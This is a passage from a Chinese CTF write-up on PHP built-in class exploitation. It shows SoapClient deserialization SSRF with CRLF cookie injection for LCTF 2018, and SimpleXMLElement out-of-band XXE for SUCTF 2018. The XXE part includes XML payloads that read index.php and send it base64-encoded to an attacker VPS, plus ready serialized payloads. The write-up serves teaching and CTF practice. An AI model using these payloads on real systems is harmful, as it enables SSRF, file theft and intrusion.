<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>,<span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span> =&gt; <span class="hljs-variable">$target</span>,<span class="hljs-string">'user_agent'</span>=&gt;<span class="hljs-string">'wupco^^Content-Type: application/x-www-form-urlencoded^^'</span>.<span class="hljs-title function_ invoke__">join</span>(<span class="hljs-string">'^^'</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">'^^Content-Length: '</span>. (<span class="hljs-keyword">string</span>)<span class="hljs-title function_ invoke__">strlen</span>(<span class="hljs-variable">$post_data</span>).<span class="hljs-string">'^^^^'</span>.<span class="hljs-variable">$post_data</span>,<span class="hljs-string">'uri'</span>=&gt;<span class="hljs-string">'test'</span>));
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">'^^'</span>,<span class="hljs-string">"\n\r"</span>,<span class="hljs-variable">$b</span>);
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$b</span>;
<span class="hljs-variable">$c</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$b</span>);
<span class="hljs-variable">$c</span>-&gt;<span class="hljs-title function_ invoke__">a</span>();    <span class="hljs-comment">// 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span>
<span class="hljs-meta">?&gt;</span></code></pre>
<p>执行代码后，成功发送POST数据：</p>
<pre><code class="hljs php">root@ubuntu18:~<span class="hljs-comment"># nc -lvp 2333</span>
Listening on [<span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>] (family <span class="hljs-number">0</span>, port <span class="hljs-number">2333</span>)
Connection <span class="hljs-keyword">from</span> <span class="hljs-number">192.168</span>.<span class="hljs-number">91.1</span> <span class="hljs-number">7862</span> received!
POST / HTTP/<span class="hljs-number">1.1</span>
Host: <span class="hljs-number">192.168</span>.<span class="hljs-number">91.153</span>:<span class="hljs-number">2333</span>
Connection: Keep-Alive
User-Agent: wupco
Content-Type: application/x-www-form-urlencoded
X-Forwarded-For: <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>
Cookie: PHPSESSID=<span class="hljs-number">3</span>stu05dr969ogmprk28drnju93
Content-Length: <span class="hljs-number">11</span>
 
data=whoami
Content-Type: text/xml; charset=utf-<span class="hljs-number">8</span>
SOAPAction: <span class="hljs-string">"test#a"</span>
Content-Length: <span class="hljs-number">365</span>
 
<span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span>
&lt;SOAP-ENV:Envelope xmlns:SOAP-ENV=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/envelope/"</span> xmlns:ns1=<span class="hljs-string">"test"</span> xmlns:xsd=<span class="hljs-string">"http://www.w3.org/2001/XMLSchema"</span> xmlns:SOAP-ENC=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span> SOAP-ENV:encodingStyle=<span class="hljs-string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;&lt;SOAP-ENV:Body&gt;&lt;ns1:a/&gt;&lt;/SOAP-ENV:Body&gt;&lt;/SOAP-ENV:Envelope&gt;</code></pre>
<p><strong>[LCTF 2018]bestphp’s revenge</strong></p>
<p>题目给了源码(跟着复现一波)</p>
<pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span>
<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);
<span class="hljs-variable">$b</span> = <span class="hljs-string">'implode'</span>;
<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'f'</span>], <span class="hljs-variable">$_POST</span>);
<span class="hljs-title function_ invoke__">session_start</span>();
<span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>])) {
    <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'name'</span>] = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">'name'</span>];
}
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$_SESSION</span>);
<span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">'welcome_to_the_lctf2018'</span>);
<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);
<span class="hljs-meta">?&gt;</span> <span class="hljs-keyword">array</span>(<span class="hljs-number">0</span>) { }</code></pre>
<p>扫一下目录：flag.php</p>
<pre><code class="hljs php"><span class="hljs-keyword">echo</span> <span class="hljs-string">'only localhost can get flag!'</span>;
<span class="hljs-variable">$flag</span> = <span class="hljs-string">'LCTF{*************************}'</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">"REMOTE_ADDR"</span>]===<span class="hljs-string">"127.0.0.1"</span>){
       <span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">'flag'</span>] = <span class="hljs-variable">$flag</span>;
   }</code></pre>
<p>这里说说明了需要本地地址访问才能输出flag。</p>
<p><strong>1. 变量覆盖</strong></p>
<p>首先我们看到第一个<code>call_user_func()</code>函数里面2个参数我们都可控，因此想到用<code>extract()</code>函数进行变量覆盖，先用<code>var_dump()</code>看一下session的内容：</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625144624240.png" alt="image-20230625144624240"></p>
<p>这里能实现步骤为f赋值为extract，接着post传参b=var_dump，在第一个第一个<code>call_user_func()</code>函数中extract函数多了一个变量b，即extract(b)，由于extract函数的特性，函数内部实际上为extract（b=&gt;var_dump），于是形成$b=var_dump随后name赋值为job，在第二个<code>call_user_func()</code>函数中,构成了var_dump(array(reset($_SESSION), ‘welcome_to_the_lctf2018’))，输出参数中变量的相关信息</p>
<p><strong>2. session反序列化</strong></p>
<pre><code class="hljs plaintext">于是我们想通过`ini_set()`函数来构造`ini_set('session.serialize_handler', 'php_serialize');`来改变序列化时的处理器，从而使其和反序列化时处理引擎不同，但是这个函数不接受数组,`$_POST`中需要设置参数传输； 所以用`session_start(['serialize_handler'=&gt;'php_serialize'])`，即POST传入`serialize_handler=php_serialize`来改变处理器，因为`session_start()`中如果提供参数，那么会用其中的项目覆盖会话配置指示中的配置项。即构造 `session_start(serialize_handler=php_serialize)` 就行了。我们可以利用题目中的 `call_user_func($_GET['f'], $_POST);` 函数，传入`GET：/?f=session_start`、`POST：serialize_handler=php_serialize`，实现 `session_start(serialize_handler=php_serialize)` 的调用来修改此页面的序列化引擎为php_serialize。</code></pre>
<p><strong>3. SoapClient类的利用</strong></p>
<p>php中的<code>SoapClient</code>类可以创建soap数据报文，与wsdl接口进行交互。该内置类有一个 <code>__call</code> 方法，当 <code>__call</code> 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 <code>__call</code> 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。SoapClient 这个类也算是目前被挖掘出来最好用的一个内置类。</p>
<pre><code class="hljs plaintext">public SoapClient::SoapClient ( mixed $wsdl [, array $options ] )</code></pre>
<p>其中<code>$options</code>数组下有个<code>user_agent</code>选项，我们可以利用该选项来自定义<code>User-Agent</code>。而在HTTP协议中，HTTP Header与HTTP Body是用两个CRLF分隔的，浏览器就是根据这两个CRLF来取出HTTP 内容并显示出来。所以，一旦我们能够控制HTTP 消息头中的字符，注入一些恶意的换行，这样我们就能注入一些会话Cookie或者HTML代码。</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$target</span> = <span class="hljs-string">"http://127.0.0.1/flag.php"</span>;
<span class="hljs-variable">$attack</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SoapClient</span>(<span class="hljs-literal">null</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">'location'</span> =&gt; <span class="hljs-variable">$target</span>,
    <span class="hljs-string">'user_agent'</span> =&gt; <span class="hljs-string">"btis\r\nCookie: PHPSESSID=r9i78lda5e28i65bdlcsjb3l06\r\n"</span>,
    <span class="hljs-string">'uri'</span> =&gt; <span class="hljs-string">"123"</span>));
<span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$attack</span>));
<span class="hljs-keyword">echo</span> <span class="hljs-variable">$payload</span>;</code></pre>
<p>其中有两个必备参数<code>location</code>是要将请求发送到的SOAP服务器的URL，<code>uri</code> 是SOAP服务的目标命名空间。我们将<code>location</code>设置为<code>http://127.0.0.1/flag.php</code>即本地flag.php文件，这个条件满足了flag.php中要求的<code>$_SERVER["REMOTE_ADDR"]==="127.0.0.1"</code>，<code>uri</code>随便填就好。其中<code>user_agent</code>，是我们用来定义<code>User-Agent</code>，利用CRLF同时传入页面的<code>cookie</code>，使<code>$_SESSION['flag'] = $flag;</code>保存到指定cookie中。</p>
<pre><code class="hljs plaintext">O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A52%3A%22btis%0D%0ACookie%3A+PHPSESSID%3Dr9i78lda5e28i65bdlcsjb3l06%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D

//注意传入的时候在O前面加了一个|符号，由于序列化与反序列化处理引擎不一样，反序列化时的引擎为PHP，会将|看做键值分隔符，将其后面的内容直接反序列化，也就是在你要解析session文件时，他会将你|后面的内容反序列化</code></pre>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625151313599.png" alt="image-20230625151313599"></p>
<p>利用<code>php_serialize</code>序列化传入后，并用php反序列化处理后此时session中包含了：一个键名<code>a:1:{s:4:"name";s:222:"</code>，和一个SoapClient对象</p>
<pre><code class="hljs php"><span class="hljs-keyword">array</span>(<span class="hljs-number">1</span>) {
  [<span class="hljs-string">"a:1:{s:4:"</span>name<span class="hljs-string">";s:222:"</span><span class="hljs-string">"]=&gt;</span>
<span class="hljs-string">  object(SoapClient)#1 (5) {</span>
<span class="hljs-string">    ["</span>uri<span class="hljs-string">"]=&gt;</span>
<span class="hljs-string">    string(3) "</span><span class="hljs-number">123</span><span class="hljs-string">"</span>
<span class="hljs-string">    ["</span>location<span class="hljs-string">"]=&gt;</span>
<span class="hljs-string">    string(25) "</span>http:<span class="hljs-comment">//127.0.0.1/flag.php"</span>
    [<span class="hljs-string">"_stream_context"</span>]=&gt;
    <span class="hljs-keyword">int</span>(<span class="hljs-number">0</span>)
    [<span class="hljs-string">"_user_agent"</span>]=&gt;
    <span class="hljs-keyword">string</span>(<span class="hljs-number">52</span>) <span class="hljs-string">"John</span>
<span class="hljs-string">Cookie: PHPSESSID=c472u8eh63tvqe5kq44o4mq3b1</span>
<span class="hljs-string">"</span>
    [<span class="hljs-string">"_soap_version"</span>]=&gt;
    <span class="hljs-keyword">int</span>(<span class="hljs-number">1</span>)
  }
}</code></pre>
<p>但此时还不会触发SSRF，需要触发 <code>__call</code> 方法来造成SSRF，该方法在访问对象中一个不存在的方法时会被自动调用，所以单纯反序列化还不行，我们还需要访问该对象中一个不存在的方法，这里就用到了如下这段代码：</p>
<pre><code class="hljs php"><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">'welcome_to_the_lctf2018'</span>);
<span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$b</span>, <span class="hljs-variable">$a</span>);</code></pre>
<p>我们可以利用extract函数将变量b覆盖为call_user_func，这样，就成了：</p>
<pre><code class="hljs php"><span class="hljs-title function_ invoke__">call_user_func</span>(call_user_func, <span class="hljs-keyword">array</span>(<span class="hljs-title function_ invoke__">reset</span>(<span class="hljs-variable">$_SESSION</span>), <span class="hljs-string">'welcome_to_the_lctf2018'</span>));</code></pre>
<p>call_user_func()函数有一个特性，就是当只传入一个数组时，可以用call_user_func()来调用一个类里面的方法，call_user_func()会将这个数组中的第一个值当做类名，第二个值当做方法名。</p>
<p>下面我们用<code>extract()</code>将<code>$b</code>覆盖成<code>call_user_func()</code>，<code>reset($_SESSION)</code>就是<code>$_SESSION['name']</code>，所以我们传入<code>name=SoapClient</code></p>
<p>最后的<code>call_user_func($b, $a)</code>就变成了<code>call_user_func(array('SoapClient','welcome_to_the_lctf2018'))</code>,即<code>call_user_func(SoapClient-&gt;welcome_to_the_lctf2018)</code>。</p>
<p>因为<code>SoapClient</code>对象中没有<code>welcome_to_the_lctf2018</code>这个方法，就会调用魔术方法<code>__call()</code>从而发送请求，造成SSRF去访问flag.php。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625152050380.png" alt="image-20230625152050380"></p>
<p>如上图，访问之后，自动发送了http请求，访问session文件，此时PHP反序列化引擎会反序列化你之前输入的内容，于是成功绕过本地地址访问的限制，于是变量flag存入session，然后我们接着访问index.php，页面会输出session文件的内容，回显flag</p>
<p>这一步由于会触发SSRF请求，因此会等待很久。</p>
<h3 id="104-simplexmlelement-类进行-xxe">10.4 SimpleXMLElement 类进行 XXE</h3>
<h4 id="simplexmlelement-类">SimpleXMLElement 类</h4>
<p>SimpleXMLElement 这个内置类用于解析 XML 文档中的元素。</p>
<p>官方文档中对于SimpleXMLElement 类的构造方法 <code>SimpleXMLElement::__construct</code> 的定义如下：</p>
<pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-title class_">SimpleXMLElement</span>::<span class="hljs-title function_ invoke__">__construct</span>(
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$data</span>,
    <span class="hljs-keyword">int</span> <span class="hljs-variable">$options</span> = <span class="hljs-number">0</span>,
    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$dataIsURL</span> = <span class="hljs-literal">false</span>,
    <span class="hljs-keyword">string</span> <span class="hljs-variable">$namespaceOrPrefix</span> = <span class="hljs-string">""</span>,
    <span class="hljs-keyword">bool</span> <span class="hljs-variable">$isPrefix</span> = <span class="hljs-literal">false</span>
)</code></pre>
<p>其中值得注意的是<code>$data</code>和<code>$data_is_url</code>这两个参数：</p>
<p><code>$data</code>：格式正确的XML字符串，或者XML文档的路径或URL（如果<code>$data_is_url</code>为true）。</p>
<p><code>$data_is_url</code>：默认情况下<code>$data_is_url</code>为false。使用true指定<code>$data</code>的路径或URL到一个XML文件，而不是字符串数据。</p>
<p>可以看到通过设置第三个参数 <code>$data_is_url</code> 为 <code>true</code>，我们可以实现远程xml文件的载入。第二个参数的常量值我们设置为<code>2</code>即可。第一个参数 data 就是我们自己设置的payload的url地址，即用于引入的外部实体的url。</p>
<p>这样的话，当我们可以控制目标调用的类的时候，便可以通过 SimpleXMLElement 这个内置类来构造 XXE。</p>
<p>example：</p>
<pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>
<span class="hljs-variable">$xml</span> = <span class="hljs-string">&lt;&lt;&lt;EOF</span>
<span class="hljs-string">&lt;?xml version="1.0" encoding="utf-8" ?&gt;</span>
<span class="hljs-string">&lt;!DOCTYPE ANY [</span>
<span class="hljs-string">    &lt;!ENTITY % remote SYSTEM "http://t6n089.ceye.io"&gt;%remote;]&gt;</span>
<span class="hljs-string">]&gt;</span>
<span class="hljs-string">&lt;x&gt;&amp;xee&lt;/x&gt;</span>
<span class="hljs-string">EOF</span>;
<span class="hljs-variable">$xml_class</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">SimpleXMLElement</span>(<span class="hljs-variable">$xml</span>, LIBXML_NOENT);
<span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$xml_class</span>);
<span class="hljs-meta">?&gt;</span></code></pre>
<p>实现了引用外部实体。同理我们可以让上面代码中的<code>$xml</code>中的内容放到自己的VPS中，然后在新建类对象的时候第一个参数写的是URL地址去实现XML文件的远程载入，这样也能实现XXE。</p>
<p><strong>[SUCTF 2018]Homework</strong></p>
<p><strong>题目分析</strong></p>
<p>先注册账号登陆作业平台。看到一个<code>calc</code>计算器类。有两个按钮，一个用于调用<code>calc</code>类实现两位数的四则运算。另一个用于提交代码。</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625154719893.png" alt="image-20230625154719893"></p>
<p>点击CALC按钮，观察返回的结果和URL</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625154746462.png" alt="image-20230625154746462"></p>
<p>再根据<code>calc</code>类里面的内容，不难判断得知，这里通过<code>module</code>传参去调用<code>calc</code>类，然后剩下3个变量是<code>calc($args1,$method,$args2)</code>函数中参数。</p>
<p><strong>SimpleXMLElement 类的使用</strong></p>
<p>首先，我们在vps（124.220.233.26）上构造如下evil.xml、send.xml这两个文件。</p>
<p>evil.xml：</p>
<pre><code class="hljs html"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span>?&gt;</span>
<span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">try</span>[</span>
<span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">int</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"https://VPS/tmp/semd.xml"</span>&gt;</span></span>
<span class="hljs-meta">%int;</span>
<span class="hljs-meta">%all;</span>
<span class="hljs-meta">%send;</span>
<span class="hljs-meta">]&gt;</span></code></pre>
<p>send.xml：</p>
<pre><code class="hljs xml"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">payl</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">"php://filter/read=convert.base64-encode/resource=index.php"</span>&gt;</span>
<span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">all</span> <span class="hljs-string">"&lt;!ENTITY &amp;#37; send SYSTEM 'https://VPS/?%payl;'&gt;"</span>&gt;</span></code></pre>
<p>然后在url中构造如下：</p>
<pre><code class="hljs http">/show.php?module=SimpleXMLElement&amp;args[]=http://124.220.233.26/tmp/evil.xml&amp;args[]=2&amp;args[]=true</code></pre>
<p>然后我们就可以看web日志：（这个作者也是埋坑呢，这里他用的https协议，我们改成http即可）</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625160526050.png" alt="image-20230625160526050"></p>
<p>base64解码，得到源码</p>
<p><img class="lazy" src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" data-src="image-20230625160610328.png" alt="image-20230625160610328"></p>
<pre><code class="hljs php">&lt;!DOCTYPE html&gt;
&lt;html&gt;
&lt;head&gt;
&lt;title&gt;PHP Homework Platform&lt;/title&gt;
&lt;meta name=<span class="hljs-string">"viewport"</span> content=<span class="hljs-string">"width=device-width, initial-scale=1"</span>&gt;
&lt;meta http-equiv=<span class="hljs-string">"Content-Type"</span> content=<span class="hljs-string">"text/html; charset=utf-8"</span> /&gt;
&lt;script type=<span class="hljs-string">"application/x-javascript"</span>&gt; <span class="hljs-title function_ invoke__">addEventListener</span>(<span class="hljs-string">"load"</span>, function() { <span class="hljs-title function_ invoke__">setTimeout</span>(hideURLbar, <span class="hljs-number">0</span>); }, <span class="hljs-literal">false</span>); <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">hideURLbar</span>(<span class="hljs-params"></span>)</span>{ window.<span class="hljs-title function_ invoke__">scrollTo</span>(<span class="hljs-number">0</span>,<span class="hljs-number">1</span>); } &lt;/script&gt;
&lt;link href=<span class="hljs-string">"css/font-awesome.min.css"</span> rel=<span class="hljs-string">"stylesheet"</span> type=<span class="hljs-string">"text/css"</span> media=<span class="hljs-string">"all"</span>&gt;
&lt;link href=<span class="hljs-string">"css/snow.css"</span> rel=<span class="hljs-string">"stylesheet"</span> type=<span class="hljs-string">"text/css"</span> media=<span class="hljs-string">"all"</span> /&gt;
&lt;link href=<span class="hljs-string">"css/style.css"</span> rel=<span class="hljs-string">"stylesheet"</span> type=<span class="hljs-string">"text/css"</span> media=<span class="hljs-string">"all"</span> /&gt;
&lt;link type=<span class="hljs-string">"text/css"</span> rel=<span class="hljs-string">"stylesheet"</span> href=<span class="hljs-string">"images/Styles/SyntaxHighlighter.css"</span>&gt;&lt;/link&gt;
&lt;/head&gt;
&lt;body&gt;
&lt;!-- /home/wwwroot/<span class="hljs-keyword">default</span>--&gt;
&lt;div <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">snow</span>-<span class="hljs-title">container</span>"&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">foreground</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">foreground</span> <span class="hljs-title">layered</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">middleground</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">middleground</span> <span class="hljs-title">layered</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">background</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			  &lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">snow</span> <span class="hljs-title">background</span> <span class="hljs-title">layered</span>"&gt;&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">			&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class"></span>
<span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">top</span>-<span class="hljs-title">buttons</span>-<span class="hljs-title">agileinfo</span>"&gt;</span>
<span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">h1</span>&gt;<span class="hljs-title">PHP</span> <span class="hljs-title">Homework</span> <span class="hljs-title">Platform</span>&lt;/<span class="hljs-title">h1</span>&gt;</span>
<span class="hljs-class">&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">main</span>-<span class="hljs-title">agileits</span>"&gt;</span>
<span class="hljs-class">&lt;?<span class="hljs-title">php</span></span>
<span class="hljs-class">	<span class="hljs-title">include</span>("<span class="hljs-title">function</span>.<span class="hljs-title">php</span>");</span>
<span class="hljs-class">	<span class="hljs-title">include</span>("<span class="hljs-title">config</span>.<span class="hljs-title">php</span>");</span>
<span class="hljs-class"></span>
<span class="hljs-class">	$<span class="hljs-title">username</span>=<span class="hljs-title">w_addslashes</span>($<span class="hljs-title">_COOKIE</span>['<span class="hljs-title">user</span>']);</span>
<span class="hljs-class">	$<span class="hljs-title">check_code</span>=$<span class="hljs-title">_COOKIE</span>['<span class="hljs-title">cookie</span>-<span class="hljs-title">check</span>'];</span>
<span class="hljs-class">	$<span class="hljs-title">check_sql</span>="<span class="hljs-title">select</span> <span class="hljs-title">password</span> <span class="hljs-title">from</span> <span class="hljs-title">user</span> <span class="hljs-title">where</span> <span class="hljs-title">username</span>='".$<span class="hljs-title">username</span>."'";</span>
<span class="hljs-class">	$<span class="hljs-title">check_sum</span>=<span class="hljs-title">md5</span>($<span class="hljs-title">username</span>.<span class="hljs-title">sql_result</span>($<span class="hljs-title">check_sql</span>,$<span class="hljs-title">mysql</span>)['0']['0']);</span>
<span class="hljs-class">	<span class="hljs-title">if</span>($<span class="hljs-title">check_sum</span>!==$<span class="hljs-title">check_code</span>)</span>{
		<span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">"Location: login.php"</span>);
	}
<span class="hljs-meta">?&gt;</span>
		&lt;textarea name=<span class="hljs-string">"code"</span> <span class="hljs-class"><span class="hljs-keyword">class</span>="<span class="hljs-title">php</span>" <span class="hljs-title">rows</span>="20" <span class="hljs-title">cols</span>="55" <span class="hljs-title">disabled</span>="<span class="hljs-title">disabled</span>"&gt;</span>
<span class="hljs-class">&lt;?<span class="hljs-title">php</span> <span class="hljs-title">readfile</span>("./<span class="hljs-title">calc</span>.<span class="hljs-title">php</span>");?&gt;</span>
<span class="hljs-class">		&lt;/<span class="hljs-title">textarea</span>&gt;</span>
<span class="hljs-class">		&lt;<span class="hljs-title">div</span> <span class="hljs-title">class</span>="<span class="hljs-title">top</span>-<span class="hljs-title">buttons</span>-<span class="hljs-title">agileinfo</span>"&gt;</span>
<span class="hljs-class">			&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">show</span>.<span class="hljs-title">php</span>?<span class="hljs-title">module</span>=<span class="hljs-title">calc</span>&amp;<span class="hljs-title">args</span>[]=2&amp;<span class="hljs-title">args</span>[]=<span class="hljs-title">a</span>&amp;<span class="hljs-title">args</span>[]=2"&gt;<span class="hljs-title">calc</span>&lt;/<span class="hljs-title">a</span>&gt;</span>
<span class="hljs-class">			&lt;<span class="hljs-title">a</span> <span class="hljs-title">href</span>="<span class="hljs-title">submit</span>.<span class="hljs-title">php</span>" <span class="hljs-title">class</span>="<span class="hljs-title">active</span>"&gt;<span class="hljs-title">Submit</span> <span class="hljs-title">homework</span>&lt;/<span class="hljs-title">a</span>&gt;</span>
<span class="hljs-class">		&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">&lt;/<span class="hljs-title">div</span>&gt;</span>
<span class="hljs-class">	&lt;<span class="hljs-title">script</span> <span class="hljs-title">type</span>="<span class="hljs-title">text</span>/<span class="hljs-title">javascript</span>" <span class="hljs-title">src</span>="<span class="hljs-title">js</span>/<span class="hljs-title">jquery</span>-2.1.4.<span class="hljs-title">min</span>.<span class="hljs-title">js</span>"&gt;&lt;/<span class="hljs-title">script</span>&gt;</span>
<span class="hljs-class">	&lt;<span class="hljs-title">script</span> <span class="hljs-title">class</span>="<span class="hljs-title">javascript</span>" <span class="hljs-title">src</span>="<span class="hljs-title">images</span>/<span class="hljs-title">Scripts</span>/<span class="hljs-title">shBrushPhp</span>.<span class="hljs-title">js</span>"&gt;&lt;/<span class="hljs-title">script</span>&gt;</span>
<span class="hljs-class">	&lt;<span class="hljs-title">script</span> <span class="hljs-title">class</span>="<span class="hljs-title">javascript</span>"&gt;</span>
